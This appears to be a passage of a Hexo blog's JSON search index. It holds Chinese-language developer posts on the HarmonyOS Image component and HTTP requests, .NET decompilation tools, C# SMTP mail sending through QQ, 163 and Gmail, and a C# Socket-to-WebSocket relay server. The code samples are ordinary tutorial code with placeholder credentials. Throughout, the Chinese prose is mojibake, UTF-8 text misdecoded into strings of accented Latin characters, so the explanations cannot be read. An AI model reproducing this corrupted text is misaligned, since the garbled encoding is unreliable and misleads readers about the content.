å‚æ•°ç±»å‹ é»˜è®¤å€¼ æè¿° alt string | Resource - åŠ è½½æ—¶æ˜¾ç¤ºçš„å ä½å›¾ã€‚ä»…æ”¯æŒæœ¬åœ°å›¾ç‰‡ã€‚ objectFit ImageFit Cover è®¾ç½®å›¾ç‰‡çš„ç¼©æ”¾ç±»å‹ã€‚ objectRepeat ImageRepeat NoRepeat è®¾ç½®å›¾ç‰‡çš„é‡å¤æ ·å¼ã€‚è¯´æ˜ï¼šsvgç±»å‹å›¾æºä¸æ”¯æŒè¯¥å±æ€§ã€‚ interpolation ImageInterpolation None è®¾ç½®å›¾ç‰‡çš„æ’å€¼æ•ˆæœï¼Œå³å‡è½»ä½æ¸…æ™°åº¦å›¾ç‰‡åœ¨æ”¾å¤§æ˜¾ç¤ºçš„æ—¶å€™å‡ºç°çš„é”¯é½¿é—®é¢˜ï¼Œä»…é’ˆå¯¹å›¾ç‰‡æ”¾å¤§æ’å€¼ã€‚è¯´æ˜ï¼š- svgç±»å‹å›¾æºä¸æ”¯æŒè¯¥å±æ€§ã€‚- PixelMapèµ„æºä¸æ”¯æŒè¯¥å±æ€§ã€‚ renderMode ImageRenderMode Original è®¾ç½®å›¾ç‰‡æ¸²æŸ“çš„æ¨¡å¼ã€‚è¯´æ˜ï¼šsvgç±»å‹å›¾æºä¸æ”¯æŒè¯¥å±æ€§ã€‚ sourceSize {width: number,height: number} - è®¾ç½®å›¾ç‰‡è§£ç å°ºå¯¸ï¼Œå°†åŸå§‹å›¾ç‰‡ è§£ç æˆæŒ‡å®šå°ºå¯¸çš„å›¾ç‰‡ï¼Œ numberç±»å‹å•ä½ä¸ºpxã€‚è¯´æ˜ï¼šPixelMapèµ„æºå’ŒSVGå›¾ç‰‡ä¸æ”¯æŒè¯¥å±æ€§ã€‚ matchTextDirection boolean false è®¾ç½®å›¾ç‰‡æ˜¯å¦è·Ÿéšç³»ç»Ÿè¯­è¨€æ–¹å‘ï¼Œåœ¨RTLè¯­è¨€ç¯å¢ƒä¸‹æ˜¾ç¤ºé•œåƒç¿»è½¬æ˜¾ç¤ºæ•ˆæœã€‚ fitOriginalSize boolean true å›¾ç‰‡ç»„ä»¶å°ºå¯¸æœªè®¾ç½®æ—¶ï¼Œå…¶æ˜¾ç¤ºå°ºå¯¸æ˜¯å¦è·Ÿéšå›¾æºå°ºå¯¸ã€‚ fillColor ResourceColor - ä»…å¯¹svgå›¾æºç”Ÿæ•ˆï¼Œè®¾ç½®åä¼šæ›¿æ¢svgå›¾ç‰‡çš„fillé¢œè‰²ã€‚ autoResize boolean true æ˜¯å¦éœ€è¦åœ¨å›¾ç‰‡è§£ç è¿‡ç¨‹ä¸­å¯¹å›¾æºåšresizeæ“ä½œï¼Œè¯¥æ“ä½œä¼šæ ¹æ®æ˜¾ç¤ºåŒºåŸŸçš„å°ºå¯¸å†³å®šç”¨äºç»˜åˆ¶çš„å›¾æºå°ºå¯¸ï¼Œæœ‰åˆ©äºå‡å°‘å†…å­˜å ç”¨ã€‚ syncLoad8+ boolean false è®¾ç½®æ˜¯å¦åŒæ­¥åŠ è½½å›¾ç‰‡ï¼Œé»˜è®¤æ˜¯å¼‚æ­¥åŠ è½½ã€‚åŒæ­¥åŠ è½½æ—¶é˜»å¡UIçº¿ç¨‹ï¼Œä¸ä¼šæ˜¾ç¤ºå ä½å›¾ã€‚ ImageInterpolationæšä¸¾è¯´æ˜ åç§° æè¿° None ä¸ä½¿ç”¨æ’å€¼å›¾ç‰‡æ•°æ®ã€‚ High é«˜åº¦ä½¿ç”¨æ’å€¼å›¾ç‰‡æ•°æ®ï¼Œå¯èƒ½ä¼šå½±å“å›¾ç‰‡æ¸²æŸ“çš„é€Ÿåº¦ã€‚ Medium ä¸­åº¦ä½¿ç”¨æ’å€¼å›¾ç‰‡æ•°æ®ã€‚ Low ä½åº¦ä½¿ç”¨æ’å€¼å›¾ç‰‡æ•°æ®ã€‚ ImageRenderModeæšä¸¾è¯´æ˜ åç§° æè¿° Original æŒ‰ç…§åŸå›¾è¿›è¡Œæ¸²æŸ“ï¼ŒåŒ…æ‹¬é¢œè‰²ã€‚ Template å°†å›¾åƒæ¸²æŸ“ä¸ºæ¨¡æ¿å›¾åƒï¼Œå¿½ç•¥å›¾ç‰‡çš„é¢œè‰²ä¿¡æ¯ã€‚ äº‹ä»¶ åç§° åŠŸèƒ½æè¿° onComplete(callback: (event?: { width: number, height: number, componentWidth: number,componentHeight: number, loadingStatus: number }) =&gt; void) å›¾ç‰‡æˆåŠŸåŠ è½½æ—¶è§¦å‘è¯¥å›è°ƒï¼Œè¿”å›æˆåŠŸåŠ è½½çš„å›¾æºå°ºå¯¸ã€‚ onError(callback: (event?: { componentWidth: number, componentHeight: number }) =&gt; void) å›¾ç‰‡åŠ è½½å‡ºç°å¼‚å¸¸æ—¶è§¦å‘è¯¥å›è°ƒã€‚ onFinish(event: () =&gt; void) å½“åŠ è½½çš„æºæ–‡ä»¶ä¸ºå¸¦åŠ¨æ•ˆçš„svgå›¾ç‰‡æ—¶ï¼Œå½“svgåŠ¨æ•ˆæ’­æ”¾å®Œæˆæ—¶ä¼šè§¦å‘è¿™ä¸ªå›è°ƒï¼Œå¦‚æœåŠ¨æ•ˆä¸ºæ— é™å¾ªç¯åŠ¨æ•ˆï¼Œåˆ™ä¸ä¼šè§¦å‘è¿™ä¸ªå›è°ƒã€‚ 1Image($r(&#x27;app.media.icon&#x27;)).width(&#x27;80vp&#x27;) ğŸ˜´åƒç´ å•ä½åƒç´ å•ä½ æä¾›4ç§åƒç´ å•ä½ï¼Œæ¡†æ¶é‡‡ç”¨vpä¸ºåŸºå‡†æ•°æ®å•ä½ã€‚ åç§° æè¿° px å±å¹•ç‰©ç†åƒç´ å•ä½ã€‚ vp å±å¹•å¯†åº¦ç›¸å…³åƒç´ ï¼Œæ ¹æ®å±å¹•åƒç´ å¯†åº¦è½¬æ¢ä¸ºå±å¹•ç‰©ç†åƒç´ ï¼Œå½“æ•°å€¼ä¸å¸¦å•ä½æ—¶ï¼Œé»˜è®¤å•ä½vpã€‚ fp å­—ä½“åƒç´ ï¼Œä¸vpç±»ä¼¼é€‚ç”¨å±å¹•å¯†åº¦å˜åŒ–ï¼Œéšç³»ç»Ÿå­—ä½“å¤§å°è®¾ç½®å˜åŒ–ã€‚ lpx è§†çª—é€»è¾‘åƒç´ å•ä½ï¼Œlpxå•ä½ä¸ºå®é™…å±å¹•å®½åº¦ä¸é€»è¾‘å®½åº¦ï¼ˆé€šè¿‡designWidthé…ç½®ï¼‰çš„æ¯”å€¼ã€‚å¦‚é…ç½®designWidthä¸º720æ—¶ï¼Œåœ¨å®é™…å®½åº¦ä¸º1440ç‰©ç†åƒç´ çš„å±å¹•ä¸Šï¼Œ1lpxä¸º2pxå¤§å°ã€‚ åƒç´ å•ä½è½¬æ¢ æä¾›å…¶ä»–å•ä½ä¸pxå•ä½äº’ç›¸è½¬æ¢çš„æ–¹æ³•ã€‚ æ¥å£ æè¿° vp2px(value : number) : number å°†vpå•ä½çš„æ•°å€¼è½¬æ¢ä¸ºä»¥pxä¸ºå•ä½çš„æ•°å€¼ã€‚ px2vp(value : number) : number å°†pxå•ä½çš„æ•°å€¼è½¬æ¢ä¸ºä»¥vpä¸ºå•ä½çš„æ•°å€¼ã€‚ fp2px(value : number) : number å°†fpå•ä½çš„æ•°å€¼è½¬æ¢ä¸ºä»¥pxä¸ºå•ä½çš„æ•°å€¼ã€‚ px2fp(value : number) : number å°†pxå•ä½çš„æ•°å€¼è½¬æ¢ä¸ºä»¥fpä¸ºå•ä½çš„æ•°å€¼ã€‚ lpx2px(value : number) : number å°†lpxå•ä½çš„æ•°å€¼è½¬æ¢ä¸ºä»¥pxä¸ºå•ä½çš„æ•°å€¼ã€‚ px2lpx(value : number) : number å°†pxå•ä½çš„æ•°å€¼è½¬æ¢ä¸ºä»¥lpxä¸ºå•ä½çš„æ•°å€¼ã€‚ ğŸ›°ï¸é¢„è§ˆå™¨ç¼–è¾‘å™¨å¸¸ç”¨çš„ çœŸæœºlog é¢„è§ˆå™¨logâ€‹é¢„è§ˆç¼–è¾‘å™¨â€‹ ç»„ä»¶é¢„è§ˆâ€‹ â€‹ ğŸ‘‰è¯·æ±‚åç«¯æ¥å£æµ‹è¯•import ohos.net.http 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// test.etsimport http from &#x27;@ohos.net.http&#x27;;export function test()&#123; // æ¯ä¸€ä¸ªhttpRequestå¯¹åº”ä¸€ä¸ªHTTPè¯·æ±‚ä»»åŠ¡ï¼Œä¸å¯å¤ç”¨ let httpRequest = http.createHttp(); // ç”¨äºè®¢é˜…HTTPå“åº”å¤´ï¼Œæ­¤æ¥å£ä¼šæ¯”requestè¯·æ±‚å…ˆè¿”å›ã€‚å¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€è¦è®¢é˜…æ­¤æ¶ˆæ¯ // ä»API 8å¼€å§‹ï¼Œä½¿ç”¨on(&#x27;headersReceive&#x27;, Callback)æ›¿ä»£on(&#x27;headerReceive&#x27;, AsyncCallback)ã€‚ 8+ httpRequest.on(&#x27;headersReceive&#x27;, (header) =&gt; &#123; console.info(&#x27;header: &#x27; + JSON.stringify(header)); &#125;); httpRequest.request( // å¡«å†™HTTPè¯·æ±‚çš„URLåœ°å€ï¼Œå¯ä»¥å¸¦å‚æ•°ä¹Ÿå¯ä»¥ä¸å¸¦å‚æ•°ã€‚URLåœ°å€éœ€è¦å¼€å‘è€…è‡ªå®šä¹‰ã€‚è¯·æ±‚çš„å‚æ•°å¯ä»¥åœ¨extraDataä¸­æŒ‡å®š &quot;/api/userApi/RegIMUser&quot;, &#123; method: http.RequestMethod.POST, // å¯é€‰ï¼Œé»˜è®¤ä¸ºhttp.RequestMethod.GET // å¼€å‘è€…æ ¹æ®è‡ªèº«ä¸šåŠ¡éœ€è¦æ·»åŠ headerå­—æ®µ header: &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125;, // å½“ä½¿ç”¨POSTè¯·æ±‚æ—¶æ­¤å­—æ®µç”¨äºä¼ é€’å†…å®¹ extraData: &#123; &quot;mobile&quot;: &quot;20240419&quot;, &quot;password&quot;: &quot;123123&quot;, &quot;ucode&quot;: &quot;666666&quot; &#125;, expectDataType: http.HttpDataType.STRING, // å¯é€‰ï¼ŒæŒ‡å®šè¿”å›æ•°æ®çš„ç±»å‹ usingCache: true, // å¯é€‰ï¼Œé»˜è®¤ä¸ºtrue priority: 1, // å¯é€‰ï¼Œé»˜è®¤ä¸º1 connectTimeout: 60000, // å¯é€‰ï¼Œé»˜è®¤ä¸º60000ms readTimeout: 60000, // å¯é€‰ï¼Œé»˜è®¤ä¸º60000ms usingProtocol: http.HttpProtocol.HTTP1_1, // å¯é€‰ï¼Œåè®®ç±»å‹é»˜è®¤å€¼ç”±ç³»ç»Ÿè‡ªåŠ¨æŒ‡å®š &#125;, (err, data) =&gt; &#123; if (!err) &#123; // data.resultä¸ºHTTPå“åº”å†…å®¹ï¼Œå¯æ ¹æ®ä¸šåŠ¡éœ€è¦è¿›è¡Œè§£æ console.info(&#x27;Result:&#x27; + JSON.stringify(data.result)); console.info(&#x27;code:&#x27; + JSON.stringify(data.responseCode)); // data.headerä¸ºHTTPå“åº”å¤´ï¼Œå¯æ ¹æ®ä¸šåŠ¡éœ€è¦è¿›è¡Œè§£æ console.info(&#x27;header:&#x27; + JSON.stringify(data.header)); console.info(&#x27;cookies:&#x27; + JSON.stringify(data.cookies)); // 8+ return JSON.stringify(data.result); &#125; else &#123; console.info(&#x27;error:&#x27; + JSON.stringify(err)); // å–æ¶ˆè®¢é˜…HTTPå“åº”å¤´äº‹ä»¶ httpRequest.off(&#x27;headersReceive&#x27;); // å½“è¯¥è¯·æ±‚ä½¿ç”¨å®Œæ¯•æ—¶ï¼Œè°ƒç”¨destroyæ–¹æ³•ä¸»åŠ¨é”€æ¯ httpRequest.destroy(); return JSON.stringify(err); &#125; &#125; );&#125; index.etsè°ƒç”¨ 123456789// index.etsimport &#123;test&#125; from &#x27;../Common/Stest&#x27; onPageShow() &#123; console.info(&#x27;Index onPageShow&#x27;); const tests = test(); &#125; è¯·æ±‚ç»“æœ â€‹ sqlæŸ¥è¯¢ â€‹ End ğŸ¦‰","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"}],"author":"mu"},{"title":".NET åç¼–è¯‘","slug":"NET-Reflector","date":"2024-04-20T22:14:22.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/21/NET-Reflector/","permalink":"https://banjinmei.github.io/2024/04/21/NET-Reflector/","excerpt":"","text":"åç¼–è¯‘æ˜¯å¯¹ç¨‹åºè¿›è¡Œé€†å‘åˆ†æã€ç ”ç©¶ï¼Œä»¥æ¨å¯¼å‡ºè½¯ä»¶äº§å“æ‰€ä½¿ç”¨çš„æ€è·¯ã€åŸç†ã€ç»“æ„ã€ç®—æ³•ã€å¤„ç†è¿‡ç¨‹ã€è¿è¡Œæ–¹æ³•ç­‰è®¾è®¡è¦ç´ ã€‚ åç¼–è¯‘.NETç¨‹åºéœ€è¦ä½¿ç”¨ä¸“é—¨çš„åç¼–è¯‘å·¥å…· ğŸ§¿ä½¿ç”¨dotPeekè¿›è¡Œåç¼–è¯‘1.ä¸‹è½½dotPeekdotPeekï¼šJetBrains å‡ºå“çš„å…è´¹ .NET åç¼–è¯‘å™¨ä¸ç¨‹åºé›†æµè§ˆå™¨ â€‹ 2.File &gt; Open â€‹ 3.æ‰“å¼€éœ€è¦åç¼–è¯‘çš„æ–‡ä»¶æ–¹æ³• â€‹ ğŸ§â€â™‚ï¸ä½¿ç”¨ILSpyè¿›è¡Œåç¼–è¯‘ ä¸‹è½½å¹¶å®‰è£…ILSpyï¼šhttps://github.com/icsharpcode/ILSpy/releases 2.æ–‡ä»¶-æ‰“å¼€-exe â€‹ 3.æŸ¥çœ‹åç¼–è¯‘å†…å®¹ æ‰¾åˆ°Form1 å¯ä»¥çœ‹åˆ°é‡Œé¢åç¼–è¯‘çš„å†…å®¹ â€‹ å¤åˆ¶åˆ°vsé‡Œé¢ æ›¿æ¢ä»£ç æ·»åŠ ç›¸å…³å¼•ç”¨å³å¯ ğŸ¤–ä½¿ç”¨Reflectorè¿›è¡Œåç¼–è¯‘1.File &gt; Open Assembly â€‹â€‹ 2.ç‚¹å¼€WinTime.exeå†…å®¹ â€‹ 3.æŸ¥çœ‹åç¼–è¯‘å†…å®¹ å¯ä»¥çœ‹åˆ°åç¼–è¯‘å‡ºæ¥çš„æ§ä»¶å’Œæ–¹æ³•â€‹ ç‚¹å¼€æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æ–¹æ³•å†…çš„å†…å®¹ æ³¨æ„ï¼š åç¼–è¯‘çš„ä»£ç å¯èƒ½ä¸å®Œå…¨ç­‰åŒäºåŸå§‹æºä»£ç ï¼Œå› ä¸ºç¼–è¯‘å™¨å¯èƒ½ä¼šè¿›è¡Œä¼˜åŒ–ï¼Œå¹¶ä¸”æŸäº›ä¿¡æ¯å¯èƒ½å› ä¸ºæ··æ·†æŠ€æœ¯è€Œæ— æ³•æ¢å¤ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"}],"author":"mu"},{"title":".NET SMTP","slug":"NET-Smtp","date":"2024-04-20T13:13:11.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/20/NET-Smtp/","permalink":"https://banjinmei.github.io/2024/04/20/NET-Smtp/","excerpt":"","text":"SMTPï¼ˆSimple Mail Transfer Protocolï¼‰æ˜¯ç”¨äºç”µå­é‚®ä»¶ä¼ è¾“çš„è§„åˆ™é›†ï¼Œå¯ä»¥ä»é‚®ä»¶å®¢æˆ·ç«¯å‘æ¥æ”¶ç”µå­é‚®ä»¶æœåŠ¡å™¨å‘é€ã€ä¸­ç»§æˆ–è½¬å‘é‚®ä»¶ã€‚å‘ä»¶äººå¯ä½¿ç”¨SMTP æœåŠ¡å™¨æ¥æ‰§è¡Œå‘é€ç”µå­é‚®ä»¶çš„è¿‡ç¨‹ã€‚SMTPæœåŠ¡å™¨åˆ™æ˜¯æŒ‰ç…§è¿™äº›è§„åˆ™ä¸­è½¬ç”µå­é‚®ä»¶çš„æœåŠ¡å™¨ã€‚ IMAPå¯ä»¥ç†è§£ä¸ºæ”¶é‚®ä»¶ã€‚â€‹ ğŸ§ä½¿ç”¨QQé‚®ç®±å‘é‚®ä»¶é¦–å…ˆéœ€è¦è®¾ç½®å¼€å¯é‚®ç®±çš„SMTPæœåŠ¡ ç™»å½•(https://mail.qq.com/)ç”µè„‘ç½‘é¡µç‰ˆé‚®ç®±è¿›å…¥ã€è®¾ç½®ã€‘-&gt;ã€å¸æˆ·ã€‘-&gt;ã€POP3/IMAP/SMTPæœåŠ¡ã€‘ï¼Œ å¼€å¯æˆ–å…³é—­ç›¸åº”æœåŠ¡æœ€åä¿å­˜æ›´æ”¹å³å¯ã€‚â€‹ QQé‚®ç®± POP3 å’Œ SMTP æœåŠ¡å™¨åœ°å€è®¾ç½®å¦‚ä¸‹ï¼š é‚®ç®± POP3æœåŠ¡å™¨ï¼ˆç«¯å£995ï¼‰ SMTPæœåŠ¡å™¨ï¼ˆç«¯å£465æˆ–587ï¼‰qq.com pop.qq.com smtp.qq.comSMTPæœåŠ¡å™¨éœ€è¦èº«ä»½éªŒè¯ã€‚ ä»¥ä¸‹æ˜¯ç¤ºä¾‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778using ConsoleApp1Test;//xxxstring server = &quot;smtp.qq.com&quot;;string username = &quot;my test email&quot;;string password = &quot;xxx;string from = &quot;from@qq.com&quot;;string to = &quot;to@qq.com&quot;;string subject = &quot;Test Email&quot;;string content = &quot;This is a test email sent asynchronously.&quot;;bool isHtml = false; // æ˜¯å¦ä¸º HTML æ ¼å¼try&#123; bool success = await MailHelper. SendMailAsync(server, username, password, from, to, null, subject, content, isHtml); if (success) &#123; Console.WriteLine(&quot;é‚®ä»¶å‘é€æˆåŠŸï¼&quot;); &#125; else &#123; Console.WriteLine(&quot;é‚®ä»¶å‘é€å¤±è´¥ï¼&quot;); &#125;&#125;catch (Exception ex)&#123; Console.WriteLine($&quot;é‚®ä»¶å‘é€å‡ºé”™ï¼š&#123;ex.Message&#125;&quot;);&#125;using System;using System.Collections.Generic;using System.Linq;using System.Net.Mail;using System.Text;using System.Threading.Tasks; namespace ConsoleApp1Test&#123; internal class MailHelper &#123; public static async Task&lt;bool&gt; SendMailAsync(string server, string username, string password, string from, string to, string cc, string subject, string content, bool isHtml) &#123; try &#123; using (var smtp = new SmtpClient(server)) &#123; smtp.UseDefaultCredentials = false; smtp.Credentials = new System.Net.NetworkCredential(username, password); smtp.EnableSsl = true; // å¯ç”¨åŠ å¯† smtp.DeliveryMethod = SmtpDeliveryMethod.Network; using (var mail = new MailMessage()) &#123; mail.From = new MailAddress(from); mail.To.Add(to); mail.SubjectEncoding = Encoding.UTF8; mail.Subject = subject; mail.IsBodyHtml = isHtml; mail.BodyEncoding = Encoding.UTF8; mail.Body = content; await smtp.SendMailAsync(mail); // å¼‚æ­¥å‘é€é‚®ä»¶ &#125; return true; &#125; &#125; catch (Exception err) &#123; // å‘é€å¤±è´¥æ—¶çš„å¼‚å¸¸å¤„ç† // å¯ä»¥åœ¨æ­¤å¤„è®°å½•æ—¥å¿— return false; &#125; &#125; &#125;&#125; â€‹â€‹ ğŸ·ä½¿ç”¨ç½‘æ˜“é‚®ç®±å‘é€é‚®ä»¶163ç½‘æ˜“å…è´¹é‚® è®¾ç½® &gt; POP3&#x2F;SMTP&#x2F;IMAP â€‹â€‹ ä½¿ç”¨ç½‘æ˜“é‚®ç®±å‘é€é‚®ä»¶ä¸Šè¿°ç¤ºä¾‹ç±»ä¼¼ï¼Œåªéœ€æ›¿æ¢ç›¸åº”çš„æœåŠ¡å™¨åœ°å€ã€ç”¨æˆ·åã€å¯†ç ã€å‘ä»¶äººã€æ”¶ä»¶äººã€ä¸»é¢˜ã€å†…å®¹ç­‰ä¿¡æ¯å³å¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647string server = &quot;smtp.163.com&quot;;string username = &quot;f@163.com&quot;;string password = &quot;xxx&quot;;string from = &quot;f@163.com&quot;;string to = &quot;t@qq.com&quot;;string subject = &quot;Test163Email m&quot;;string content = &quot;This is a test email &quot;;bool isHtml = false; // æ˜¯å¦ä¸º HTML æ ¼å¼``` c#è¿è¡Œï¼šâ€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa07.jpg&quot; &gt;â€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa08.jpg&quot; &gt;â€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa09.jpg&quot; &gt;# ğŸ¬ä½¿ç”¨è°·æ­Œé‚®ç®±å‘é€é‚®ä»¶è°·æ­ŒGmailé‚®ç®±ç™»é™†åœ°å€ï¼šhttps://mail.google.comâ€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa10.jpg&quot; &gt;â€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa11.jpg&quot; &gt;è°·æ­Œimapå¼€é€š smtpä¹Ÿè‡ªåŠ¨å¼€é€š https://myaccount.google.com/â€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa12.jpg&quot; &gt;â€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa13.jpg&quot; &gt;æ¥æ”¶é‚®ä»¶ (IMAP) æœåŠ¡å™¨ imap.gmail.comè¦æ±‚ SSLï¼šæ˜¯ç«¯å£ï¼š993å‘é€é‚®ä»¶ (SMTP) æœåŠ¡å™¨ smtp.gmail.comè¦æ±‚ SSLï¼šæ˜¯è¦æ±‚ TLSï¼šæ˜¯ï¼ˆå¦‚é€‚ç”¨ï¼‰ä½¿ç”¨èº«ä»½éªŒè¯ï¼šæ˜¯SSL ç«¯å£ï¼š465TLS/STARTTLS ç«¯å£ï¼š587ä½¿ç”¨è°·æ­Œé‚®ç®±ä¿®æ”¹å¯¹åº”çš„æœåŠ¡å™¨åœ°å€ã€ç”¨æˆ·åã€å¯†ç ã€å‘ä»¶äººã€æ”¶ä»¶äººã€ä¸»é¢˜ã€å†…å®¹ç­‰ä¿¡æ¯å³å¯ã€‚``` c#string server = &quot;smtp.gmail.com&quot;;string username = &quot;f@gmail.com&quot;;string password = &quot;xx&quot;;string from = &quot;f@gmail.com&quot;;string to = &quot;t@qq.com&quot;;string subject = &quot;TestSMTPEmail m&quot;;string content = &quot;This is a test email sent using Gmail SMTP.m&quot;;bool isHtml = false; // æ˜¯å¦ä¸º HTML æ ¼å¼ è¿è¡Œï¼š â€‹â€‹ ğŸ“®æœ‰äº›å…è´¹é‚®ç®±å¯¹å‘ä¿¡é‡æœ‰é™åˆ¶ï¼Œå¯ä½¿ç”¨ä¼ä¸šé‚®ï¼Œå¤šè´¦å·å¢åŠ å‘ä¿¡é‡ã€‚ END","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"}],"author":"mu"},{"title":"Socket to WebSocket","slug":"NET-Socket","date":"2024-04-20T04:56:50.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/20/NET-Socket/","permalink":"https://banjinmei.github.io/2024/04/20/NET-Socket/","excerpt":"","text":"å‰è¨€é’ˆå¯¹IOS App Proxy Serveræ— æ³•ç›´è¿WebSocketï¼Œå»ºç«‹ Socketä¸­è½¬ç«¯ã€‚ â€‹ WebSocket ç«¯ï¼š WebSocket ç«¯ç”¨äºå®ç°å®æ—¶é€šä¿¡åŠŸèƒ½ã€‚ WebSocket ç«¯é€šè¿‡ WebSocket åè®®ä¸ä¸­è½¬ç«¯é€šä¿¡ï¼Œä¸­è½¬ç«¯å¯ä»¥é€šè¿‡ WebSocket æˆ–å…¶ä»–ä¼ è¾“åè®®ä¸ WebSocket ç«¯å»ºç«‹è¿æ¥ï¼Œæ”¶å‘æ¶ˆæ¯ã€‚ å®šä¹‰ SendMessageToChatRoomIP å’Œ JoinChatRoomï¼Œç”¨äºå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„æ¶ˆæ¯å’Œè¿æ¥äº‹ä»¶ã€‚ ä¸­è½¬ç«¯ C1 ï¼ˆSocket Serverï¼‰ï¼š ä¸­è½¬ç«¯ C1 æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åº”ç”¨ç¨‹åºï¼Œç”¨äºè¿æ¥WebSocketç«¯ï¼Œå»ºç«‹SocketæœåŠ¡ã€‚ ä¸­è½¬ç«¯ C1 çš„ä¸»è¦åŠŸèƒ½æ˜¯æ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯ C2 çš„æ¶ˆæ¯ï¼Œå¹¶å°†å…¶è½¬å‘ç»™ WebSocket ç«¯ï¼Œæˆ–è€…æ¥æ”¶æ¥è‡ª WebSocket ç«¯çš„æ¶ˆæ¯ï¼Œå¹¶è½¬å‘ç»™å®¢æˆ·ç«¯ C2ã€‚ å®¢æˆ·ç«¯ C2 x N ï¼š å®¢æˆ·ç«¯ C2 ï¼Œä¸»è¦ä¸ä¸­è½¬ç«¯è¿æ¥ å‘é€æ•°æ®ï¼Œæ¥æ”¶æ•°æ®ã€‚ åœ¨å®¢æˆ·ç«¯ C2 ä¸­ï¼Œè¿æ¥åˆ°ä¸­è½¬ç«¯ C1ã€å‘é€æ¶ˆæ¯ç»™ä¸­è½¬ç«¯ C1ã€æ¥æ”¶æ¥è‡ªä¸­è½¬ç«¯ C1 çš„æ¶ˆæ¯ã€‚ è°ƒç”¨å…³ç³»ä¸ºï¼š å®¢æˆ·ç«¯ C2 é€šè¿‡ä¸ä¸­è½¬ç«¯ C1 çš„é€šä¿¡ï¼Œå‘ WebSocket ç«¯å‘é€æ¶ˆæ¯æˆ–æ¥æ”¶æ¥è‡ª WebSocket ç«¯çš„æ¶ˆæ¯ã€‚ ä¸­è½¬ç«¯ C1 æ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯ C2 çš„æ¶ˆæ¯ï¼Œå¹¶å°†å…¶è½¬å‘ç»™ WebSocket ç«¯ï¼Œæˆ–è€…æ¥æ”¶æ¥è‡ª WebSocket ç«¯çš„æ¶ˆæ¯ï¼Œå¹¶è½¬å‘ç»™å®¢æˆ·ç«¯ C2ã€‚ â€‹ ä¸­è½¬ç«¯å®ç°1.è¿æ¥WebSocket1234567891011121314151617181920212223public async Task ConnectToServer()&#123; try &#123; connection = new HubConnectionBuilder() .WithUrl(&quot;xxx/chathub&quot;)// .Build(); connection.On&lt;string, string, string, string&gt;(&quot;ReceiveMessage&quot;, async (user, message, clientIP, chatRoomId) =&gt; &#123; Console.WriteLine($&quot;Received message from wsserver_sr : &#123;user&#125;: &#123;message&#125; |socketserver &#123;clientIP&#125;|&#123;chatRoomId&#125;&quot;); // æ”¶åˆ°æ¥è‡ªæœåŠ¡å™¨çš„æ¶ˆæ¯æ—¶ï¼Œå‘å®¢æˆ·ç«¯ C2 å‘é€æ¶ˆæ¯ await SendMessageToClientC2(user, message, clientIP, chatRoomId); &#125;); await connection.StartAsync(); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error connecting to SignalR server: &#123;ex.Message&#125;&quot; + Environment.NewLine); &#125;&#125; æ”¶åˆ°æ¶ˆæ¯æ—¶å‘é€ç»™å¯¹åº”å®¢æˆ·ç«¯ 12345678910111213141516public async Task SendMessageToClientC2(string user, string message, string clientIP, string chatRoomId)&#123; // æ ¹æ® chatRoomId æ‰¾åˆ°å¯¹åº”çš„å®¢æˆ·ç«¯ C2ï¼Œå¹¶å‘é€æ¶ˆæ¯ if (chatRooms.ContainsKey(chatRoomId)) &#123; byte[] data = Encoding.ASCII.GetBytes($&quot;&#123;user&#125; &#123;message&#125; |&#123;clientIP&#125;|&#123;chatRoomId&#125; &quot;); foreach (var client in chatRooms[chatRoomId]) &#123; await client.GetStream().WriteAsync(data, 0, data.Length); &#125; &#125; else &#123; Console.WriteLine($&quot;Chat room &#123;chatRoomId&#125; does not exist&quot; + Environment.NewLine); &#125;&#125; 2.å»ºç«‹ä¸­è½¬ç«¯Socketç«¯å£1234567891011121314151617181920public void StartListening()&#123; if (!listening) &#123; try &#123; int port = 10086; // ç›‘å¬ç«¯å£ server = new TcpListener(IPAddress.Any, port); server.Start(); listening = true; Console.WriteLine($&quot;Server listening on port &#123;port&#125;&quot; + Environment.NewLine); Task.Run(() =&gt; AcceptClients()); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error starting server: &#123;ex.Message&#125;&quot; + 